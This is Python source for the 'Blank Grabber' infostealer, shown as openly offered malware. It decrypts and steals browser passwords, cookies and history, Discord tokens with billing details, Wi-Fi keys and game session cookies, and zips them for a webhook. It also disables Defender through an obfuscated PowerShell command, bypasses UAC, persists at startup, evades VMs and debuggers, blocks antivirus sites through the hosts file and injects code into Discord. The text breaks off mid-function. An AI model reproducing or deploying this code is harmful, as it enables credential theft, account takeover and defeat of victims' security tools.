# Python 3.10+
# Author: Blank-c
# Github: https://github.com/Blank-c/Blank-Grabber
# Encoding: UTF-8

import base64
import os
import subprocess
import sys
import json
import pyaes
import random
import shutil
import sqlite3
import re
import traceback
import time

from threading import Thread
from urllib3 import PoolManager, HTTPResponse
from win32crypt import CryptUnprotectData
import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat

class Settings:
    Webhook = "%webhook%"
    PingMe = bool("%pingme%")
    Vmprotect = bool("%vmprotect%")
    Startup = bool("%startup%")
    Melt = bool("%melt%")

    CaptureWebcam = bool("%capturewebcam%")
    CapturePasswords = bool("%capturepasswords%")
    CaptureCookies = bool("%capturecookies%")
    CaptureHistory = bool("%capturehistory%")
    CaptureDiscordTokens = bool("%capturediscordtokens%")
    CaptureMinecraftSessionFiles = bool("%captureminecraft%")
    CaptureRobloxCookies = bool("%captureroblox%")
    CaptureWifiPasswords = bool("%capturewifipasswords%")
    CaptureSystemInfo = bool("%capturesysteminfo%")
    CaptureScreenshot = bool("%capturescreenshot%")

    FakeError = (bool("%fakeerror%"), ("%title%", "%message%", "%icon%"))
    BlockAvSites = bool("%blockavsites%")
    DiscordInjection = bool("%discordinjection%")

class VmProtect:
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def checkUUID() -> bool:
        uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
        return uuid in VmProtect.BLACKLISTED_UUIDS

    @staticmethod
    def checkComputerName() -> bool:
        computername = os.getenv("computername")
        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool:
        user = os.getlogin()
        return user.lower() in VmProtect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool:
        http = PoolManager()
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
        except Exception:
            return False

    @staticmethod
    def checkHTTPSimulation() -> bool:
        http = PoolManager()
        try:
            http.request('GET', f'https://blank{Utility.GetRandomName()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool:
        r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
        r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck

    @staticmethod
    def killTasks() -> None:
        out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
        for i in out:
            i = i.split("\r\n")[:2]
            name, pid = i[0].split()[-1].rstrip('.exe'), int(i[1].split()[-1])
            if not name in VmProtect.BLACKLISTED_TASKS:
                continue
            subprocess.run(f'taskkill /F /PID {pid}', shell= True, capture_output= True)

    @staticmethod
    def isVM() -> bool:
        Thread(target= VmProtect.killTasks, daemon= True).start()
        return VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry() #or vmprotect.checkHTTPSimulation()

class Errors:
    errors: list[str] = []

    @staticmethod 
    def Catch(func):
        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    Errors.errors.append(trb)
        
        return newFunc

class Tasks:
    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.threads.append(task)
    
    @staticmethod
    def WaitForAll() -> None:
        for thread in Tasks.threads:
            thread.join()

class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def DisableDefender() -> None:
        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
        subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    @staticmethod
    def ExcludeFromDefender(path: str = None) -> None:
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
    
    @staticmethod
    def GetRandomName(length: int = 5, invisible: bool = False):
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
    
    @staticmethod
    def GetWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()

        for line in subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
            if 'All User Profile' in line:
                name= line[(line.find(':') + 1):].strip()
                profiles.append(name)
        
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[(line.find(':') + 1):].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords
    
    @staticmethod
    def IsAdmin() -> bool:
        return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
    
    @staticmethod
    def UACbypass(method: int = 1) -> None:
        if not hasattr(sys, "frozen"):
            return
        
        def execute(cmd: str): return subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
        
        if method == 1:
            if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
            if not execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): Utility.UACbypass(2)
            execute("computerdefaults --nouacbypass")
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")

        elif method == 2:

            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            execute("fodhelper --nouacbypass")
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
        
        os._exit(0)
    
    @staticmethod
    def IsInStartup() -> bool:
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == "startup"
    
    @staticmethod
    def PutInStartup() -> str:
        STARTUPDIR = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
        file, isExecutable = Utility.GetSelf()
        if isExecutable:
            out = os.path.join(STARTUPDIR, "{}.scr".format(Utility.GetRandomName(invisible= True)))
            os.makedirs(STARTUPDIR, exist_ok= True)
            try: shutil.copy(file, out) 
            except Exception: return None
            return out
    
    @staticmethod
    def IsConnectedToInternet() -> bool:
        http = PoolManager()
        try:
            return http.request("GET", "https://gstatic.com/generate_204").status == 204
        except Exception:
            return False
    
    @staticmethod
    def DeleteSelf():
        path, frozen = Utility.GetSelf()
        if frozen:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)
    
    @staticmethod
    def HideSelf() -> None:
        path, _ = Utility.GetSelf()
        subprocess.Popen('attrib +h +s "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def BlockSites() -> None:
        if not Utility.IsAdmin() or not Settings.BlockAvSites:
            return
        call = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath", shell= True, capture_output= True)
        if call.returncode != 0:
            hostdirpath = os.path.join("System32", "drivers", "etc")
        else:
            hostdirpath = os.sep.join(call.stdout.decode(errors= "ignore").strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
        hostfilepath = os.path.join(os.getenv("systemroot"), hostdirpath , "hosts")
        if not os.path.isfile(hostfilepath):
            return
        with open(hostfilepath) as file:
            data = file.readlines()

        BANNED_SITES = ("virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com", "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com", "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "ccleaner.com")
        newdata = []
        for i in data:
            if any([(x in i) for x in BANNED_SITES]):
                continue
            else:
                newdata.append(i)

        for i in BANNED_SITES:
            newdata.append("\t0.0.0.0 {}".format(i))
            newdata.append("\t0.0.0.0 www.{}".format(i))

        newdata = "\n".join(newdata).replace("\n\n", "\n")
        with open(hostfilepath, "w") as file:
            file.write(newdata)

class Browsers:

    class Chromium:

        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath):
                raise NotADirectoryError("Browser path not found!")

            self.BrowserPath = browserPath
        
        def GetEncryptionKey(self) -> bytes | None:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            
            else:
                localStatePath = os.path.join(self.BrowserPath, "Local State")
                if os.path.isfile(localStatePath):
                    with open(localStatePath, encoding= "utf-8", errors= "ignore") as file:
                        jsonContent: dict = json.load(file)

                    encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

                    self.EncryptionKey = CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
                    return self.EncryptionKey

                else:
                    return None
        
        def Decrypt(self, buffer: bytes, key: bytes) -> str:

            version = buffer.decode(errors= "ignore")
            if (version.startswith(("v10", "v11"))):
                iv = buffer[3:15]
                cipherText = buffer[15:]

                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode()
            else:
                return str(CryptUnprotectData(buffer, None, None, None, 0)[1])
        
        def GetPasswords(self) -> list[tuple[str, str, str]]:
            encryptionKey = self.GetEncryptionKey()
            passwords = list()

            if encryptionKey is None:
                return passwords

            loginFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == "login data":
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            
            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomName(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break
                
                shutil.copy(path, tempfile)
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b : b.decode(errors= "ignore")
                cursor = db.cursor()
                try:
                    results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)

                        if url and username and password:
                            passwords.append((url, username, password))

                except Exception:
                    pass

                cursor.close()
                db.close()
                os.remove(tempfile)
            
            return passwords
        
        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
            encryptionKey = self.GetEncryptionKey()
            cookies = list()

            if encryptionKey is None:
                return cookies
            
            cookiesFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == "cookies":
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            
            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomName(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break
                
                shutil.copy(path, tempfile)
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b : b.decode(errors= "ignore")
                cursor = db.cursor()
                try:
                    results = cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall()

                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)

                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))

                except Exception:
                        pass

                cursor.close()
                db.close()
                os.remove(tempfile)
            
            return cookies
        
        def GetHistory(self) -> list[tuple[str, str, int]]:
            history = list()

            historyFilePaths = list()

            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)
            
            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomName(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break
                
                shutil.copy(path, tempfile)
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b : b.decode(errors= "ignore")
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()

                    for url, title, vc, lvt in results:
                        if url and title and vc is not None and lvt is not None:
                                history.append((url, title, vc, lvt))
                except Exception:
                    pass
                    
                cursor.close()
                db.close()
                os.remove(tempfile)
            
            history.sort(key= lambda x: x[3], reverse= True)
            return list([(x[0], x[1], x[2]) for x in history])

class Discord:
    httpClient = PoolManager() # Client for http requests
    ROAMING = os.getenv("appdata")
    LOCALAPPDATA = os.getenv("localappdata")

    @staticmethod
    def GetHeaders(token: str = None) -> dict:
        headers = {
        "content-type" : "application/json",
        "user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
        }

        if token:
            headers["authorization"] = token

        return headers
    
    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()

        paths = {
            "Discord": os.path.join(Discord.ROAMING, "discord"),
            "Discord Canary": os.path.join(Discord.ROAMING, "discordcanary"),
            "Lightcord": os.path.join(Discord.ROAMING, "Lightcord"),
            "Discord PTB": os.path.join(Discord.ROAMING, "discordptb"),
            "Opera": os.path.join(Discord.ROAMING, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(Discord.ROAMING, "Opera Software", "Opera GX Stable"),
            "Amigo": os.path.join(Discord.LOCALAPPDATA, "Amigo", "User Data"),
            "Torch": os.path.join(Discord.LOCALAPPDATA, "Torch", "User Data"),
            "Kometa": os.path.join(Discord.LOCALAPPDATA, "Kometa", "User Data"),
            "Orbitum": os.path.join(Discord.LOCALAPPDATA, "Orbitum", "User Data"),
            "CentBrowse": os.path.join(Discord.LOCALAPPDATA, "CentBrowser", "User Data"),
            "7Sta": os.path.join(Discord.LOCALAPPDATA, "7Star", "7Star", "User Data"),
            "Sputnik": os.path.join(Discord.LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
            "Vivaldi": os.path.join(Discord.LOCALAPPDATA, "Vivaldi", "User Data"),
            "Chrome SxS": os.path.join(Discord.LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
            "Chrome": os.path.join(Discord.LOCALAPPDATA, "Google", "Chrome", "User Data"),
            "FireFox" : os.path.join(Discord.ROAMING, "Mozilla", "Firefox", "Profiles"),
            "Epic Privacy Browse": os.path.join(Discord.LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
            "Microsoft Edge": os.path.join(Discord.LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
            "Uran": os.path.join(Discord.LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
            "Yandex": os.path.join(Discord.LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
            "Brave": os.path.join(Discord.LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
            "Iridium": os.path.join(Discord.LOCALAPPDATA, "Iridium", "User Data"),
        }

        for name, path in paths.items():
            if os.path.isdir(path):
                if name == "FireFox":
                    t = Thread(target= lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target= lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)

                    t = Thread(target= lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)
        
        for thread in threads:
            thread.join()
        
        tokens = [*set(tokens)]
        
        for token in tokens:
            r: HTTPResponse = Discord.httpClient.request("GET", "https://discord.com/api/v9/users/@me", headers= Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode()
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified=r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {
                    0 : 'No Nitro',
                    1 : 'Nitro Classic',
                    2 : 'Nitro',
                    3 : 'Nitro Basic'
                }

                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')

                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode())
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {
                        'Card' : 0,
                        'Paypal' : 0,
                        'Unknown' : 0,
                    }
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)
                        if method_type == 0:
                            methods['Unknown'] += 1
                        elif method_type == 1:
                            methods['Card'] += 1
                        else:
                            methods['Paypal'] += 1
                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.GetHeaders(token)).data.decode()
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({
                    'USERNAME' : user,
                    'USERID' : id,
                    'MFA' : mfa,
                    'EMAIL' : email,
                    'PHONE' : phone,
                    'VERIFIED' : verified,
                    'NITRO' : nitro_data,
                    'BILLING' : billing,
                    'TOKEN' : token,
                    'GIFTS' : gifts
                })

        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None

        localStatePath = os.path.join(path, "Local State")
        levelDbPath = os.path.join(path, "Local Storage", "leveldb")

        if os.path.isfile(localStatePath) and os.path.isdir(levelDbPath):
            with open(localStatePath, errors= "ignore") as file:
                jsonContent: dict = json.load(file)
                
            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]
                
            for file in os.listdir(levelDbPath):
                if file.endswith((".log", ".ldb")):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors= "ignore") as file:
                        lines = file.readlines()
                        
                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if not match in encryptedTokens:
                                    match = base64.b64decode(match.split("dQw4w9WgXcQ:")[1].encode())
                                    encryptedTokens.append(match)
        
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], token[3:15]).decrypt(token[15:])[:-16].decode(errors= "ignore")
                if token:
                    tokens.append(token)
            except Exception:
                pass
        
        return tokens
    
    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()

        for file in os.listdir():
            if file.endswith((".log", ".ldb")):
                filepath = os.path.join(path, file)
                with open(filepath, errors= "ignore") as file:
                    lines = file.readlines()
                
                for line in lines:
                    if line.strip():
                        matches: list[str] = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line)
                        for match in matches:
                            match = match.rstrip("\\")
                            if not match in tokens:
                                tokens.append(match)
    
    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()

        for root, _, files in os.walk(path):
                for file in files:
                    if file.lower().endswith(".sqlite"):
                        filepath = os.path.join(root, file)
                        with open(filepath, errors= "ignore") as file:
                            lines = file.readlines()
                
                            for line in lines:
                                if line.strip():
                                    matches: list[str] = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line)
                                    for match in matches:
                                        match = match.rstrip("\\")
                                        if not match in tokens:
                                            tokens.append(match)

        return tokens
    
    @staticmethod
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b"%injectionbase64encoded%").decode().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.Webhook.encode()).decode()))
        except Exception:
            return None
        
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding= 'utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path
            else:
                yield None

class BlankGrabber:

    Separator: str = None
    TempFolder: str = None
    ArchivePath: str = None

    Cookies: list = []
    Passwords: list = []
    History: list = []
    RobloxCookies: list = []
    DiscordTokens: list = []
    WifiPasswords: list = []
    Screenshot: int = 0
    MinecraftSessions: int = 0
    WebcamPictures: int = 0

    def __init__(self) -> None:
        self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n"
        
        while True:
            self.ArchivePath = os.path.join(os.getenv("temp"), Utility.GetRandomName() + ".zip")
            if not os.path.isfile(self.ArchivePath):
                break

        while True:
            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomName(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok= True)
                break
        
        for func, daemon in (
            (self.StealBrowserData, False),
            (self.StealDiscordTokens, False),
            (self.StealMinecraft, False),
            (self.GetAntivirus, False),
            (self.GetClipboard, False),
            (self.GetTaskList, False),
            (self.GetDirectoryTree, False),
            (self.GetWifiPasswords, False),
            (self.StealSystemInfo, False),
            (self.TakeScreenshot, False),
            (self.BlockSites, True),
            (self.Webshot, True)
        ):
            thread = Thread(target= func, daemon= daemon)
            thread.start()
            Tasks.AddTask(thread)
        
        Tasks.WaitForAll()
        if Errors.errors:
            with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
        shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder) # Compress collected data
        self.SendData()
        try:
            os.remove(self.ArchivePath)
            shutil.rmtree(self.TempFolder)
        except Exception as e:
            print(e)

    @Errors.Catch
    def StealMinecraft(self) -> None:
        if Settings.CaptureMinecraftSessionFiles:
            minecraftDir = os.path.join(os.getenv("appdata"), ".minecraft")
            copyToDir = os.path.join(self.TempFolder, "Games", "Minecraft")

            if os.path.isfile(os.path.join(minecraftDir, "launcher_profiles.json")):
                for name in os.listdir(minecraftDir):
                    filePath = os.path.join(minecraftDir, name)
                    copyTo = os.path.join(copyToDir, name)

                    if os.path.isfile(filePath):
                        os.makedirs(copyToDir, exist_ok= True)
                        shutil.copy(filePath, copyTo)
                
                self.MinecraftSessions += 1
    
    @Errors.Catch
    def StealRobloxCookies(self) -> None:
        saveToDir = os.path.join(self.TempFolder, "Games", "Roblox")
        note = "# The tokens found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."

        browserCookies = "\n".join(self.Cookies)
        for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
            self.RobloxCookies.append(match)
        
        output = str()
        for item in ('HKCU', 'HKLM'):
            process = subprocess.run("powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY".format(item), capture_output= True, shell= True)
            if not process.returncode:
                output.append(process.stdout.decode(errors= "ignore"))
        
        for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", "\n".join(output)):
            self.RobloxCookies.append(match)
        
        self.RobloxCookies = [*set(self.RobloxCookies)] # Removes duplicates

        if(self.RobloxCookies):
            os.makedirs(saveToDir, exist_ok= True)
